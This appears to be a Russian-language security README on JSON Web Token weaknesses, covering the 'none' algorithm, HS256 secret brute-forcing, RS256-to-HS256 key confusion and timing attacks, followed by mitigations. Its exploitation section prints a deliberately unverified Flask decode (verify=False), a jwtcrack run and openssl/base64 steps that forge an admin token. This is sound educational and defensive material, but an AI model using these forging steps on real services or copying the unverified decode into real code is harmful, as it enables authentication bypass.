# jwt_insecure

![JWT](https://cdn.auth0.com/blog/jwtc/jwt_05.jpg)

## JSON Web Token

> JSON Web Token (JWT) - открытый стандарт ([RFC 7519](https://tools.ietf.org/html/rfc7519)), который определяет компактный и автономный способ безопасного передачи информации между сторонами как объект JSON.

Эта информация может быть проверена и проверена, поскольку она имеет цифровую подпись. Токены могут быть не подписаны или подписаны подписаны с использованием симметричного или ассиметричного ключей.

> JWT - протокол аутентификации

Это формирует строгий набор инструкций для выдачи и проверки подписанных токенов доступа. В токенах содержатся данные, которые используются для определения уровня прав доступа пользователя к сервису.

> JWT бывают двух видов : JSON Web Signature ([RFC 7515](https://tools.ietf.org/html/rfc7515)) и JSON Web Encryption ([RFC 7516](https://tools.ietf.org/html/rfc7516))

JWS подписывают данных JSON, которые состоят из трех частей, в то время как JWEs шифруются данные в формате JSON и состоит из пяти частей:

![сериализ](https://trustfoundry.net/wp-content/uploads/2017/12/jws-vs-jwe.jpg)

## Структура JWT

![](https://uploads.toptal.io/blog/image/956/toptal-blog-image-1426676395222.jpeg)

JWT состоит из трех частей
- Header содержит информацию, как должна вычисляться JWT подпись
- Payload — это полезные данные, которые хранятся внутри JWT.
- Подпись, вычесляемая по алгоритму указнному в Header

#### Виды алгоритмов:

##### Подписи нет, передаются только данные Header и Payload.
```python
'none': NoneAlgorithm()
```
##### Симметричные шифры

```python
'HS256' : HMACAlgorithm(HMACAlgorithm.SHA256)
'HS384' : HMACAlgorithm(HMACAlgorithm.SHA384)
'HS512' : HMACAlgorithm(HMACAlgorithm.SHA512)
```
##### Ассиметричные шифры

```python
'RS256':RSAAlgorithm(RSAAlgorithm.SHA256)
'RS384':RSAAlgorithm(RSAAlgorithm.SHA384)
'RS512':RSAAlgorithm(RSAAlgorithm.SHA512)

'ES256':ECAlgorithm(ECAlgorithm.SHA256)
'ES384':ECAlgorithm(ECAlgorithm.SHA384)
'ES512':ECAlgorithm(ECAlgorithm.SHA512)

'PS256':RSAPSSAlgorithm(RSAPSSAlgorithm.SHA256)
'PS384':RSAPSSAlgorithm(RSAPSSAlgorithm.SHA384)
'PS512':RSAPSSAlgorithm(RSAPSSAlgorithm.SHA512)
```
> Но в основном используются следующие связки:
> - HMAC + SHA256
> - RSASSA-PKCS1-v1_5 + SHA256
> - ECDSA + P-256 + SHA256

#### Валидация токена в общем виде выполняется следующем образом. [статья](https://dzone.com/articles/spring-boot-security-json-web-tokenjwt-hello-world)

![](https://www.javainuse.com/62-3-min.JPG)

## Источники угроз

#### Чувствительные данные в JWT

У JWT есть два объекта JSON, которые хранят информацию. Сам токен закодирован в base64, который может быть легко декодирован первой же ссылкой в гугле. В Payload могут находиться данные карт и чего либо подобного. А с помощью доступной информации о алгоритме вы можете расшифровать полезную нагрузку.

#### Измените алгоритм на «None»

По большей части уязвимость jwt токенов заключается в использовании типа `None` ~~*(который должен Обязательно присутствовать)*~~ для аутентификции и к тому что все токены можно свести к нему.

Злоумышленник изменяет токен и алгоритм шифрования на `None`. Некоторые библиотеки рассматривают эти токены, как действительныe. Поэтому злоумышленник, изменив токен, может получить доступ к сервису, а тот будет доверять ему.

```python
class NoneAlgorithm(Algorithm):

    def prepare_key(self, key):
        if key == '':
            key = None

        if key is not None:
            raise InvalidKeyError('When alg = "none", key value must be None.')

        return key

    def sign(self, msg, key):
        return b''

    def verify(self, msg, key, sig):
        return False
```

#### Взлом ключа HS256

HS256 алгоритм использует секретный ключ для подписи и подтверждения токенов, узнав этот ключ, можно самостоятельно подписывать токены. Если ключ недостаточно силен, его можно получить с помощью атаки методом перебора или словаря. Это возможно сделать без каких-либо запросов к серверу, как только мы получили токен.

##### Инструменты для брута:
- John the Ripper (https://www.openwall.com/john/)
- https://github.com/jmaxxz/jwtbrute
- https://github.com/brendan-rius/c-jwt-cracker

#### Эксплуатация RS256

RS256 использует пару ключей для подписи и проверки каждого сообщения. Алгоритм использует открытый ключ для подписи сообщений. Так как открытый ключ не является тайной, мы можем правильно подписывать такие сообщения. Вот как можно их использовать:

> 1. Получить токен, подписанный RSA (есть доступ только к открытому ключу). 
> 2. Расшифруйте заголовок и измените алгоритм с RSA «RS256» на HMAC «HS256».
> 3. Восстанавливаем токен с полезной нагрузкой
> 4. Подпишу токен открытым ключом RSA
>
> https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/

#### Локальное хранилище

Можно вытащить из браузера всю инфу включая его локальное хранилище или же из авмяти. Оттуда достать токен и использовать его для авторизованного доступа к сервисам.


#### Timing Attack [.источник](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)

Атака по побочному каналу, при которой можно скомпрометировать криптосистему, измерив, сколько времени потребуется системе, чтобы ответить на разные входы. Для проверки подписи с использованием криптографии с симметричным ключом сервер обычно вычисляет побайтово действительную подпись и сравнивает ее с предоставленной. Однако, если байт не совпадает, мы прекращаем сравнивать другие байты. Измеряя время ответа сервера можно определять верное количество байт.
Потребовалось бы 256 попыток найти первый байт 256-битной сигнатуры; еще 256 попыток найти второй байт и так далее. Потребуется 8192 попытки найти полную действительную 256-битную подпись. Сила 256-битной подписи будет снижаться до 13 бит.


### Наиболее часто встречаемые CVE:  
https://www.cvedetails.com/product/31809/F21-JWT.html?vendor_id=15434  
https://www.cvedetails.com/cve/CVE-2017-12974/    
https://www.cvedetails.com/cve/CVE-2017-12973/  
https://www.cvedetails.com/cve/CVE-2017-12972/  
https://www.cvedetails.com/cve/CVE-2019-7644/  
https://nvd.nist.gov/vuln/detail/CVE-2019-7644  
https://pivotal.io/security/cve-2018-15801  

## Условия
- ОС: любая
- язык: json
- компоненты: библиотеки, базы данных, фреймворки, брокеры очередей и т.д.
- настройки: использование стандартных настроек приводит к уязвимости, дополнительное меры безопасности частично закроют дырки.


## Детектирование

[Burp suit](https://github.com/mvetsch/JWT4B) - есть несколько плагинов.

## Эксплуатация

Структура токена:

HEADER:ALGORITHM & TOKEN TYPE
```
{
  "typ": "JWT",
  "alg": "HS256"
}
PAYLOAD:DATA

{
  "username": "user",
  "is_admin": true
}
{
  "username": "user",
  "is_admin": true
}
```  


Токен никогда не будет проходить процедуры проверки.

```
@app.route("/index_1", methods=['GET'])
def index_1():
	session = request.cookies.get('session')
	isLoggedIn = False

	if session is not None:
		try:
			result = jwt.decode(session, key=jwt_secret, verify=False)
			isLoggedIn = True

		except Exception as err:
			result = str(err)

	else:
		result = ''

	return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
```
```
result = jwt.decode(session, key=jwt_secret, verify = False)
```
Установка параметра verify в значение False приводит к тому, что токен будет всегда приниматься. 

Взлом HS256 тупо брутом.  
```
$ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc qwertyuiopasdfghjklzxcvbnm
Secret is "secret"
```

Подмена ассиметричного шифрования RS на симметричное HS
```
	b64_public = base64.standard_b64encode(public).decode()
  ```
Так как сервер выдает публичный ключ, то мы можем его использовать для того чтобы обмануть механизм шифрования. Так как в методах не захардкожено, необходимое шифрование, мы может заставить сервер шифровать и расшифровывать сигнатуру токена с использованием симметричного шифрования по публичному ключу.
```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDIfXNTOUNW9t6gH0OURcsbYu9f
AQIkL9fUxsIckicd67DIOyotPquMo5Ak0MJWjlirWkZnBZIyDoLkzr9a28KMhxzM
5aGvuuj5DyPBeQeJJz1Duimtw/OcbY9sUtNhQNrq2Ww2EMrjuTQXyG2Yaf6uNmlW
LB+v4AZ99OepLO+DpQIDAQAB
-----END PUBLIC KEY-----
```
Переведу его значение в hex и изменив данные в поле header (меняется шифрования с асимметрии на симметрию поле alg) и payload (добавлю в токен права админа потому что почему бы и нет) и подпишу этим публичным ключом вновь собраннуй json.
```
 "тело токена" | openssl dgst -sha256 -mac HMAC -macopt hexkey:ключвхексе
```
После чего верну получившиеся значение подписи в формат сигнатуры base64UrlEncode
```
 base64.urlsafe_b64encode(binascii.a2b_hex('db3a1b760eec81e029704691f6780c4d1653d5d91688c24e59891e97342ee59f')).replace('=','')
```
В итоге получаем токен админа, прошедший проверку ассиметричной подписи.
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ1ZX0.IFQI6Zh9Gja_d48CKHo80SZonepddPiemcz_l8WyfFI
```

https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/

## Инструменты

- PyJWT library (https://github.com/jpadilla/pyjwt)
- Burp suit (https://portswigger.net/burp)


## Ущерб

1. Если токены используются для контроля серверов, то велика вероятность слива или удаления всей базы данных.

2. Получение прав на изменение данных на серверах и сайтах.

3. JWT используются для входа в различные сервисы по типу асаны, кибаны, почты, что может привети к потере всей бизнес информации.

4. Использование токенов в физическом или электронном виде позволяет пользователям избавляться от процедур идентификации и аутентификации, и сразу переходить к получению авторизованного доступа. Злоумышленник заполучив такой ключ будет обладать всеми правами сотрудника, самое опасное в этом запуск скриптов и зловредов внутри защитного периметра.

## Защита
### Основные меры

Обязательно отключить возможность использования алгоритма `None`
Включить верификацию токена перед использованием данных из него

```
result = jwt.decode(session, key=jwt_secret, verify = True)
```
Перейти на более устойчивые версии токенов:

1. Branca
> IETF XChaCha20-Poly1305 AEAD symmetric encryption,the enrypted token is base62 encoded which makes it.
>
> Структура токена:
> `"URL safe Version (1B) || Timestamp (4B) || Nonce (24B) || Ciphertext (*B) || Tag (16B)"`
>
> https://branca.io

2. Macaroons - токены от google
> Macaroons: Cookies with Contextual Caveats for Decentralized Authorization in the Cloud
>
> https://ai.google/research/pubs/pub41892.pdf

### Превентивные меры

- Используйте сильные ключи и секреты для шифрования.

- Просмотрите библиотеки, которые вы выбираете.

- Убедитесь, что вы проверите подпись.

- Убедитесь, что ваши токены истекают.

- Использовать другое шифрование.

- Не храните данные в локальных хранилищах (и сессиях).

- Проверьте сайт на CSRF XSS.

- JSON Web Token Best Current Practices (https://datatracker.ietf.org/doc/draft-ietf-oauth-jwt-bcp/?include_text=1)

## Дополнительно
- Elleptic curves vuln (https://auth0.com/blog/critical-vulnerability-in-json-web-encryption/)
- JOSE & JSON Web Token (JWT) Examples (https://connect2id.com/products/nimbus-jose-jwt/examples)
- Owasp cheat sheet (https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.md)
- Brute Forcing HS256 is Possible: The Importance of Using Strong Keys in Signing JWTs (https://auth0.com/blog/brute-forcing-hs256-is-possible-the-importance-of-using-strong-keys-to-sign-jwts/)
- Mac vs sig attack (https://snikt.net/blog/2019/05/16/jwt-signature-vs-mac-attacks/)
